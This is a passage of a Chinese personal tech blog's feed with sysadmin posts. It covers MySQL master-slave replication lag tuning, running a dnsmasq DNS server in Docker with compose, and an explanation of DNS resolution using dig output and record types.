%  0.24 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br><span class="line">140869 be/4 hadoop      0.00 B/s   43.91 K/s  0.00 %  0.23 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br><span class="line">140966 be/4 hadoop      0.00 B/s  179.01 K/s  0.00 %  0.22 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br></pre></td></tr></table></figure><hr><p>总结: </p><p>主从延时比较关键的地方:</p><p>1.确保slave库的服务器配置和master相当,或者比master更高.<br>2.确保网络延时较低.<br>3.sync_binlog和innodb_flush_log_at_trx_commit,这两个参数决定了磁盘写入机制.如果sync_binlog设置为1.则每次操作都要回写到磁盘日志,极大的增加磁盘IO负载和同步负担.<br>4.innodb_buffer_pool_size参数调整会将mysql的整体性能提高到好几个倍数.<br>5.如果是mysql5.7以上版本,尽量使用GTID主从复制机制代替传统的Binlog机制.因为Binlog的sql线程还是单线程工作模式.<br>6.完善的监控机制.如果第一时间发现延时较高,就要尽早介入处理.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;mysql主从同步延时问题&quot;&gt;&lt;a href=&quot;#mysql主从同步延时问题&quot; class=&quot;headerlink&quot; title=&quot;mysql主从同步延时问题&quot;&gt;&lt;/a&gt;mysql主从同步延时问题&lt;/h2&gt;&lt;p&gt;最近领导将MASTER的主库清空了最近几个月的数据,进行了大并发的操作.这导致了mysql的从库延时非常高的问题.zabbix报警如下:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://pabkmteb4.bkt.clouddn.com/mysql-monitor.png&quot; alt=&quot;mysql-zabbix&quot;&gt;&lt;/p&gt;
&lt;p&gt;延时一直飙升到23个小时.&lt;/p&gt;
    
    </summary>
    
      <category term="mysql" scheme="https://jesse.top/categories/mysql/"/>
    
      <category term="mysql维护" scheme="https://jesse.top/categories/mysql/mysql%E7%BB%B4%E6%8A%A4/"/>
    
    
      <category term="mysql" scheme="https://jesse.top/tags/mysql/"/>
    
      <category term="mysql维护" scheme="https://jesse.top/tags/mysql%E7%BB%B4%E6%8A%A4/"/>
    
  </entry>
  
  <entry>
    <title>docker运行DNS服务器</title>
    <link href="https://jesse.top/2018/08/14/Linux-Service/docker%E8%BF%90%E8%A1%8CDNS%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://jesse.top/2018/08/14/Linux-Service/docker运行DNS服务器/</id>
    <published>2018-08-14T01:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.289Z</updated>
    
    <content type="html"><![CDATA[<h2 id="docker运行DNS服务器"><a href="#docker运行DNS服务器" class="headerlink" title="docker运行DNS服务器"></a>docker运行DNS服务器</h2><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>linux提供了Bind工具搭建DNS服务,但是bind配置太过复杂,需要配置正向解析,zone区域等.而且很多功能是完全用不上的.所以这里选择使用dnsmasq来作为内部DNS服务器.</p><p>dnsmasq非常小巧,简单,配置十分方便.只有3个配置文件:</p><a id="more"></a><ul><li>resolve.dnsmasq : 这个配置文件定义了上游公网的DNS服务器地址.dnsmasq把DNS请求转发给公网DNS解析</li><li>dnsmasqhosts: 静态绑定IP和域名,语法和/etc/hosts一样.这是内部DNS的主要配置文件,用于自定义域名解析</li><li>dnsmasq.conf: 这个是dnsmasq的配置文件,这个配置只有2条语句,定义2个字段指向上面2个配置文件.</li></ul><h4 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h4><ul><li><p>拉取dnsmasq系统镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull andyshinn/dnsmasq</span><br></pre></td></tr></table></figure></li><li><p>新建配置文件路径,定义配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -pv /data/conf/dns</span><br><span class="line">cd /data/conf/dns</span><br></pre></td></tr></table></figure><ul><li><p>定义resolv.dnsmasq文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi resolv.dnsmasq</span><br><span class="line">nameserver 202.96.209.133</span><br><span class="line">nameserver 114.114.114.114</span><br></pre></td></tr></table></figure></li><li><p>定义dnsmasqhosts</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi dnsmasqhosts</span><br><span class="line">10.0.4.230 www.test.com</span><br><span class="line">10.0.4.231 www.jesse.com</span><br></pre></td></tr></table></figure></li><li><p>定义dnsmasq.conf配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi dnsmasq.conf</span><br><span class="line">resolv-file=/etc/resolv.dnsmasq</span><br><span class="line">addn-hosts=/etc/dnsmasqhosts</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>定义docker启动文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">version: &quot;2&quot;</span><br><span class="line">services:</span><br><span class="line">  docker-dns:</span><br><span class="line">    container_name: dns</span><br><span class="line">    image: andyshinn/dnsmasq</span><br><span class="line">    hostname: dns</span><br><span class="line">    volumes:</span><br><span class="line">      - /data/conf/dns/resolv.dnsmasq:/etc/resolv.dnsmasq</span><br><span class="line">      - /data/conf/dns/dnsmasqhosts/:/etc/dnsmasqhosts</span><br><span class="line">      - /data/conf/dns/dnsmasq.conf/:/etc/dnsmasq.conf</span><br><span class="line">      - /etc/localtime:/etc/localtime:ro</span><br><span class="line">    ports:</span><br><span class="line">      - 53:53/tcp</span><br><span class="line">      - 53:53/udp</span><br><span class="line">    cap_add:</span><br><span class="line">      - NET_ADMIN</span><br><span class="line">    restart: on-failure:1</span><br></pre></td></tr></table></figure></li><li><p>安装compose(如果已经安装,则可以跳过此步骤)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget  https://github.com/docker/compose/releases/download/1.22.0/docker-compose-Linux-x86_64</span><br><span class="line">sudo mv docker-compose-Linux-x86_64 /usr/local/bin/docker-compose</span><br><span class="line">sudo chmod +x  /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">[work@docker ~]$docker-compose --version</span><br><span class="line">docker-compose version 1.22.0, build f46880fe</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>运行容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -f /data/conf/dns/dns.yaml up -d</span><br></pre></td></tr></table></figure></li><li><p>进入容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[work@docker ~]$docker exec -it dns /bin/sh</span><br></pre></td></tr></table></figure><blockquote><p>注意: 不能用/bin/bash进入容器</p></blockquote></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[work@docker ~]$docker exec -it dns /bin/bash</span><br><span class="line">rpc error: code = 2 desc = oci runtime error: exec failed: container_linux.go:247: starting container process caused &quot;exec: \&quot;/bin/bash\&quot;: stat /bin/bash: no such file or directory&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;docker运行DNS服务器&quot;&gt;&lt;a href=&quot;#docker运行DNS服务器&quot; class=&quot;headerlink&quot; title=&quot;docker运行DNS服务器&quot;&gt;&lt;/a&gt;docker运行DNS服务器&lt;/h2&gt;&lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h4&gt;&lt;p&gt;linux提供了Bind工具搭建DNS服务,但是bind配置太过复杂,需要配置正向解析,zone区域等.而且很多功能是完全用不上的.所以这里选择使用dnsmasq来作为内部DNS服务器.&lt;/p&gt;
&lt;p&gt;dnsmasq非常小巧,简单,配置十分方便.只有3个配置文件:&lt;/p&gt;
    
    </summary>
    
      <category term="Linux-Service" scheme="https://jesse.top/categories/Linux-Service/"/>
    
    
      <category term="DNS" scheme="https://jesse.top/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>DNS介绍</title>
    <link href="https://jesse.top/2018/08/14/Linux-Service/DNS%E4%BB%8B%E7%BB%8D/"/>
    <id>https://jesse.top/2018/08/14/Linux-Service/DNS介绍/</id>
    <published>2018-08-14T01:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.288Z</updated>
    
    <content type="html"><![CDATA[<h3 id="DNS介绍"><a href="#DNS介绍" class="headerlink" title="DNS介绍"></a>DNS介绍</h3><p>IP地址虽然采用了十分记数法.但是对于人脑来说还是非常难以记忆,但是访问互联网网站又一定需要IP,为了应对这个问题.早期的时候是通过hosts文件来绑定主机名和IP的对应关系,</p><p>但是这种方法存在非常多的不足,特别是IP和主机名的对应关系越来越多的时候.hosts档案完全无法满足人们的需求.这个时候,伯克利大学发展出一套主机名IP对应系统.称为Berkeley Internet Name Domain, BIND  .也就是目前全世界使用最广泛的Domain Name System, DNS </p><a id="more"></a><hr><p>DNS系统采用树状的阶层是架构,</p><p>最顶上是root.也称为根域名,</p><p>第二层是顶级域名.例如com,org,edu,gov,net,还有国家域名,比如cn(中国),jp(日本),uk(英国),us(美国)等.</p><p>和DNS相关的另外一个概念是FQDN( Fully Qualified Domain Name ).完全合格域名. FQDN由两部分组成:hostname和domain name (也就是主机名+域名).最著名的主机名是www.它是所有网站站点的主机名.</p><blockquote><p>举个例子: <a href="http://www.doweidu.com" target="_blank" rel="noopener">www.doweidu.com</a>  这个就是一个FQDN完全合格域名.其中doweidu.com是域名.www是主机名</p></blockquote><hr><h4 id="DNS的查询过程"><a href="#DNS的查询过程" class="headerlink" title="DNS的查询过程"></a>DNS的查询过程</h4><p> DNS 是以类似『树状目录』的型态来进行主机名的管理的！所以每一部 DNS 服务器都仅管理自己的下一层主机 .下图演示了<a href="http://www.ksu.edu.tw这个主机名的DNS查询过程" target="_blank" rel="noopener">www.ksu.edu.tw这个主机名的DNS查询过程</a>:</p><p><img src="http://pabkmteb4.bkt.clouddn.com/dns.png" alt=""></p><p>1.首先，当你在浏览器的网址列输入 <a href="http://www.ksu.edu.tw/" target="_blank" rel="noopener">http://www.ksu.edu.tw</a> 时，你的计算机就会查询本机的hosts文件,是否绑定此主机名和IP的对应关系.</p><p>2.浏览器会查看本身的DNS缓存记录</p><p>3.客户端(也就是你本机)会向DNS服务器查询<a href="http://www.ksu.edu.tw/" target="_blank" rel="noopener">http://www.ksu.edu.tw</a>的IP地址</p><p>4.如果DNS服务器没有此主机的IP地址,则想最顶层的root服务器查询.但是由于 . 只记录了 .tw 的信息,并不知道具体tw下的某个主机的IP地址.此时 . 会告诉DNS服务器它不知道主机的IP ，不过它知道tw服务器在哪里，你应该向 .tw 去询问才对，然后返回tw服务器的IP地址给DNS服务器</p><p>5.DNS Server接着又到 .tw 去查询，而该部机器管理的又仅有 .edu.tw, .com.tw, gov.tw… 那几部主机，经过比对后发现我们要的是 .edu.tw 的网域，所以这个时候 .tw 又告诉 DNS server 说：你要去管理 .edu.tw 这个网域的主机那里查询，我有他的 IP ！</p><p>6.DNS Server接着又到.edu.tw去查询, .edu.tw 也没有具体主机的IP ，它会返回DNS服务器关于.ksu.edu.tw的地址，让DNS服务器去向.ksu.edu.tw服务器查询</p><p>7.当DNS server向.ksu.edu.tw服务器查询<a href="http://www.ksu.edu.tw主机的IP地址时,由于.ksu.edu.tw服务器管理此主机的IP地址关系,所以向DNS" target="_blank" rel="noopener">www.ksu.edu.tw主机的IP地址时,由于.ksu.edu.tw服务器管理此主机的IP地址关系,所以向DNS</a> server返回正确的<a href="http://www.ksu.edu.tw主机的IP地址" target="_blank" rel="noopener">www.ksu.edu.tw主机的IP地址</a>.</p><p>8.当DNS server查询到了正确的IP地址后,会将此主机名和IP地址缓存在自己的内存中,方便后续其他主机的查询.然后将IP地址返回给客户端,(当然,这个缓存值有时间限制,一般是24小时内,该记录就会被释放).</p><p>9.此时客户端浏览器拿到了正确的IP地址,就可以通过<a href="http://www.ksu.edu.tw这个域名访问远程主机的资源.如果DNS" target="_blank" rel="noopener">www.ksu.edu.tw这个域名访问远程主机的资源.如果DNS</a> server到最后也没有查询到<a href="http://www.ksu.edu.tw主机的IP地址,DNS" target="_blank" rel="noopener">www.ksu.edu.tw主机的IP地址,DNS</a> SERVER会告诉客户端此主机名不存在.客户端浏览器会返回错误信息,告诉用户此网站名不存在.</p><p>下面的dig命令详细论证了DNS的查询过程:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$dig +trace www.ksu.edu.tw</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-61.el7 &lt;&lt;&gt;&gt; +trace www.ksu.edu.tw</span><br><span class="line">;; global options: +cmd</span><br><span class="line">.275227INNSf.root-servers.net.</span><br><span class="line">.275227INNSg.root-servers.net.</span><br><span class="line">.275227INNSk.root-servers.net.</span><br><span class="line">.275227INNSe.root-servers.net.</span><br><span class="line">.275227INNSc.root-servers.net.</span><br><span class="line">.275227INNSj.root-servers.net.</span><br><span class="line">.275227INNSd.root-servers.net.</span><br><span class="line">.275227INNSh.root-servers.net.</span><br><span class="line">.275227INNSl.root-servers.net.</span><br><span class="line">.275227INNSb.root-servers.net.</span><br><span class="line">.275227INNSm.root-servers.net.</span><br><span class="line">.275227INNSa.root-servers.net.</span><br><span class="line">.275227INNSi.root-servers.net.</span><br><span class="line">;; Received 239 bytes from 114.114.114.114#53(114.114.114.114) in 253 ms</span><br><span class="line"></span><br><span class="line">tw.172800INNSg.dns.tw.</span><br><span class="line">tw.172800INNSf.dns.tw.</span><br><span class="line">tw.172800INNSns.twnic.net.</span><br><span class="line">tw.172800INNSd.dns.tw.</span><br><span class="line">tw.172800INNSa.dns.tw.</span><br><span class="line">tw.172800INNSb.dns.tw.</span><br><span class="line">tw.172800INNSi.dns.tw.</span><br><span class="line">tw.172800INNSc.dns.tw.</span><br><span class="line">tw.172800INNSe.dns.tw.</span><br><span class="line">tw.172800INNSh.dns.tw.</span><br><span class="line">tw.172800INNSanytld.apnic.net.</span><br><span class="line">tw.86400INDS40792 8 2 A05DB4B0DEB971031361BB621E8BB1B8D7346665A3D1B06EC1431ADB 7D015EE9</span><br><span class="line">tw.86400INRRSIGDS 8 1 86400 20180822170000 20180809160000 41656 . ORWOjWoiZqcRkVip1DvoUVvxHIxQZJBsT93obIYJEdw61Vuam6IhNmYV u+cNQF9HqsfiVSJaiekiK2ERjpmkaNdJfeK/zAkYhKLa6l0JzZoJVxjj Ul/HKZIvbB07MjyZP1lM7HCAlHSAR1C+g9H1owUgW031G4L+cIQ7PVaa bBFs/C8JJbyOqR4RwkCPWmawiHEPMNsDboTepfyChdsDv+RTodb1hc0l /orfjg/AGdPxaKgn2LutLrOZRcttSYwGxg1i3aw4YcGNt8azxdXMSGqO FcfKKd4aP7sgz57NClXUSJIjCj5I30iQCQfV9V5idQlKN5MVYUBL7/Pd XghhlQ==</span><br><span class="line">;; Received 1035 bytes from 198.41.0.4#53(a.root-servers.net) in 5764 ms</span><br><span class="line"></span><br><span class="line">edu.tw.3600INNSmoestar.edu.tw.</span><br><span class="line">edu.tw.3600INNSmoemoon.edu.tw.</span><br><span class="line">edu.tw.3600INNSb.twnic.net.tw.</span><br><span class="line">edu.tw.3600INNSa.twnic.net.tw.</span><br><span class="line">edu.tw.3600INNSc.twnic.net.tw.</span><br><span class="line">edu.tw.3600INNSd.twnic.net.tw.</span><br><span class="line">edu.tw.300INDS40234 8 1 5A8AB67C461F4330D146EE4E2E5A08CE279B7BEB</span><br><span class="line">edu.tw.300INDS40234 8 2 289D061D208C871915EB07F63FB175B21022422D5365D4E945BCE397 104A9C08</span><br><span class="line">edu.tw.300INRRSIGDS 8 2 300 20180909000033 20180810000033 46080 tw. QFQiVnzdUorHMrT5IpZTYWHdH0QtEknww+Q+Ql2K9+MFwHhsNqxvk1Uw iSMdQQ9rQ92Tdql99Myv9QGrOxHWd+Ol/ULOg4I2vKIHPqskAN2F7pu1 VhWBAWQ2Tti/pArvGsAn7IaI8DuWWEoD44NjIIOo0NY9YVssz1UUvWpk PU4=</span><br><span class="line">;; Received 691 bytes from 203.73.24.25#53(a.dns.tw) in 259 ms</span><br><span class="line"></span><br><span class="line">ksu.edu.tw.300INNSdns1.ksu.edu.tw.</span><br><span class="line">ksu.edu.tw.300INNSdns3.twaren.net.</span><br><span class="line">ksu.edu.tw.300INNSdns2.ksu.edu.tw.</span><br><span class="line">2JL30RTHBS2AC6H8PKQTIF3OCINIARDM.edu.tw. 300 INNSEC3 1 0 10 9FCD30FFAD75 2KI9R34PM8A1VO5V97VNHJNVJSL0R6ON NS</span><br><span class="line">2JL30RTHBS2AC6H8PKQTIF3OCINIARDM.edu.tw. 300 INRRSIG NSEC3 8 3 300 20180813044341 20180809035735 56424 edu.tw. ebq+txlgqrK4GsZgFoZMTBUgKGcdaiXJtj2JFvKXlLLjdoJyIFC9bEsf aZSoLLfpFIBsF6qons5Yu0YaTp7ypmbMQWws9UOBs9kNnBW++Eaq97Hb RnCq8smJIYnRrmIClEs1kUAkqNEtf9s/TqmcGu3+TLswx5+tVSwbR3DX MIM=</span><br><span class="line">;; Received 388 bytes from 192.83.166.9#53(a.twnic.net.tw) in 1274 ms</span><br><span class="line"></span><br><span class="line">www.ksu.edu.tw.3600INA120.114.100.65</span><br><span class="line">ksu.edu.tw.3600INNSdns3.twaren.net.</span><br><span class="line">ksu.edu.tw.3600INNSdns1.ksu.edu.tw.</span><br><span class="line">ksu.edu.tw.3600INNSdns2.ksu.edu.tw.</span><br><span class="line">;; Received 202 bytes from 211.79.61.47#53(dns3.twaren.net) in 333 ms</span><br><span class="line"></span><br><span class="line">从以上步骤可以看到.114.114.114.114这台DNS服务器依次向以下DNS查询:</span><br><span class="line">root.(全世界一共有13台DNS根服务器)---&gt;tw.----&gt;edu.tw.---&gt;ksu.edu.tw.</span><br><span class="line">最后查询到了主机www.ksu.edu.tw.的IP地址</span><br></pre></td></tr></table></figure><hr><h4 id="DNS正向解析字段解析"><a href="#DNS正向解析字段解析" class="headerlink" title="DNS正向解析字段解析"></a>DNS正向解析字段解析</h4><p>dig对主机进行正向解析的结果有固定的格式和字段.下面解析一下各字段代表的意义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$dig www.baidu.com</span><br><span class="line">#前面省略</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;www.baidu.com.INA</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">www.baidu.com.919INCNAMEwww.a.shifen.com.</span><br><span class="line">www.a.shifen.com.209INA61.135.169.125</span><br><span class="line">www.a.shifen.com.209INA61.135.169.121</span><br><span class="line"></span><br><span class="line">;; Query time: 17 msec</span><br><span class="line">;; SERVER: 114.114.114.114#53(114.114.114.114)</span><br><span class="line">;; WHEN: Fri Aug 10 14:41:26 CST 2018</span><br><span class="line">;; MSG SIZE  rcvd: 101</span><br></pre></td></tr></table></figure><p>dig不加任何参数的情况下是查询A(address)记录,也就是主机的IP地址.上面输出结果格式简化如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[domain]   [ttl]          IN [[RR type]  [RR data]]</span><br><span class="line">[待查数据] [暂存时间(秒)]   IN [[资源类型] [资源内容]]</span><br></pre></td></tr></table></figure><p><strong>domain</strong>: 查询的主机名,最好是用FQDN完全合格域名,也就是域名后面要加一个小数点. 代表根.例如:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>. (不要忽略最后的一个.) 可以看到ANSWER SECTION字段的<a href="http://www.baidu.com.结尾有个小数点" target="_blank" rel="noopener">www.baidu.com.结尾有个小数点</a></p><p><strong>ttl:</strong> time to live.意思就是当这笔记录被其他 DNS 服务器查询到后， 这个记录会保持在对方 DNS 服务器的快取中，保持多少秒钟的意思.所以，当你反复执行 dig 之后，就会发现这个时间会减少！为什么呢？因为在你的 DNS 快取中，这笔数据能够保存的时间会开始倒数， 当这个数字归零后，下次有人再重新搜寻这笔记录时，你的 DNS 就会重新沿着 . (root) 开始重来搜寻一遍， 而不会从快取里面捉取了 (因为快取内的资料会被舍弃)。 </p><p><strong>IN</strong>: 这个关键字是固定的.</p><p><strong>RR type:</strong> 这个表示查询类型.这里是查询A记录.</p><p><strong>RR data:</strong> 查询结果.在这里是查询出来的IP地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 常见的正解文件 RR 相关信息</span><br><span class="line">[domain]    IN  [[RR type]  [RR data]]</span><br><span class="line">主机名.   IN  A           IPv4 的 IP 地址</span><br><span class="line">主机名.   IN  AAAA        IPv6 的 IP 地址</span><br><span class="line">领域名.   IN  NS          管理这个领域名的服务器主机名字.</span><br><span class="line">领域名.   IN  SOA         管理这个领域名的七个重要参数(容后说明)</span><br><span class="line">领域名.   IN  MX          顺序数字  接收邮件的服务器主机名字</span><br><span class="line">主机别名.   IN  CNAME       实际代表这个主机别名的主机名字.</span><br></pre></td></tr></table></figure><hr><p>上面演示了查询IP记录的方法.下面是查询其他类型的方法:</p><ul><li><strong>NS:查询管理领域名 (zone) 的服务器主机名</strong> </li></ul><p>如果你想要知道 <a href="http://www.haoshiqi.net" target="_blank" rel="noopener">www.haoshiqi.net</a> 的主机由哪部 DNS 服务器提供的，那就得要使用 NS (NameServer) 的 RR 类型标志来查询。不过，由于 NS 是管理整个领域的，因此，你得要查询的目标将得输入 domain，亦即 haoshiqi.net才行 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$dig -t ns haoshiqi.net</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;haoshiqi.net.INNS</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">haoshiqi.net.1720INNSns4.dnsv3.com.</span><br><span class="line">haoshiqi.net.1720INNSns3.dnsv3.com.</span><br><span class="line">#可以看到这个域名的DNS服务商是ns4.dnsv3.com.和ns3.dnsv3.com.</span><br></pre></td></tr></table></figure><hr><ul><li><strong>SOA ：查询管理领域名的服务器管理信息</strong> </li></ul><p>如果你有多部 DNS 服务器管理同一个领域名时，那么最好使用 master/slave 的方式来进行管理。既然要这样管理， 那就得要宣告被管理的 zone file 是如何进行传输的，此时就得要 SOA (Start Of Authority) 的标志了。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$dig -t soa haoshiqi.net</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;haoshiqi.net.INSOA</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">haoshiqi.net.600INSOAns3.dnsv3.com. enterprise1dnsadmin.dnspod.com. 1530265971 3600 180 1209600 180</span><br></pre></td></tr></table></figure><p>SOA 主要是与领域有关，所以前面当然要写 ksu.edu.tw 这个领域名。而 SOA 后面共会接七个参数，这七个参数的意义依序是：</p><ul><li><p>Master DNS 服务器主机名：这个领域主要是哪部 DNS 作为 master 的意思。在本例中， ns3.dnsv3.com 为 主要 DNS 服务器；</p></li><li><p>管理员的 email：那么管理员的 email 为何？发生问题可以联络这个管理员。</p></li><li><p>序号 (Serial)：这个序号代表的是这个数据库档案的新旧，序号越大代表越新。 当 slave 要判断是否主动下载新的数据库时，就以序号是否比 slave 上的还要新来判断，若是则下载，若不是则不下载。 所以当你修订了数据库内容时，记得要将这个数值放大才行！ 为了方便用户记忆，通常序号都会使用日期格式『YYYYMMDDNU』来记忆</p></li><li><p>更新频率 (Refresh)：那么啥时 slave 会去向 master 要求数据更新的判断？ 就是这个数值定义的。昆山科大的 DNS 设定每 3600 秒进行一次 slave 向 master 要求数据更新。那每次 slave 去更新时， 如果发现序号没有比较大，那就不会下载数据库档案。</p></li><li><p>失败重新尝试时间 (Retry)：如果因为某些因素，导致 slave 无法对 master 达成联机， 那么在多久的时间内，slave 会尝试重新联机到 master。在本例中，180秒会重新尝试一次。意思是说，每 180秒 slave 会主动向 master 联机，但如果该次联机没有成功，那接下来尝试联机的时间会变成 180秒。若后来有成功，则又会恢复到 180 秒才再一次联机。</p></li><li><p>失效时间 (Expire)：如果一直失败尝试时间，持续联机到达这个设定值时限， 那么 slave 将不再继续尝试联机，并且尝试删除这份下载的 zone file 信息。这设定为 1209600秒。意思是说，当联机一直失败，每 180秒尝试到达 1209600 秒后，slave 将不再更新，只能等待系统管理员的处理。</p></li><li><p>快取时间 (Minumum TTL)：如果这个数据库 zone file 中，每笔 RR 记录都没有写到 TTL 快取时间的话，那么就以这个 SOA 的设定值为主。</p><hr></li><li><p><strong>CNAME ：设定某主机名的别名 (alias)</strong></p></li></ul><p>有时候你不想要针对某个主机名设定 A 的标志，而是想透过另外一部主机名的 A 来规范这个新主机名时， 可以使用别名 (CNAME) 的设定 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$dig www.baidu.com</span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;www.baidu.com.INA</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">www.baidu.com.328INCNAMEwww.a.shifen.com.</span><br><span class="line">www.a.shifen.com.34INA61.135.169.125</span><br><span class="line">www.a.shifen.com.34INA61.135.169.121</span><br></pre></td></tr></table></figure><p>意思是说，当你要追查<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 时，请找 <a href="http://www.a.shifen.com.那个主机，而那个主机的" target="_blank" rel="noopener">www.a.shifen.com.那个主机，而那个主机的</a> A 就上面第二行的显示了。  </p><p>这个 CNAME 有啥好处呢？用 A 就好了吧？其实还是有好处的，举例来说，如果你有一个 IP，这个 IP 是给很多主机名使用的。 那么当你的 IP 更改时，所有的数据就得通通更新 A 标志才行。如果你只有一个主要主机名设定 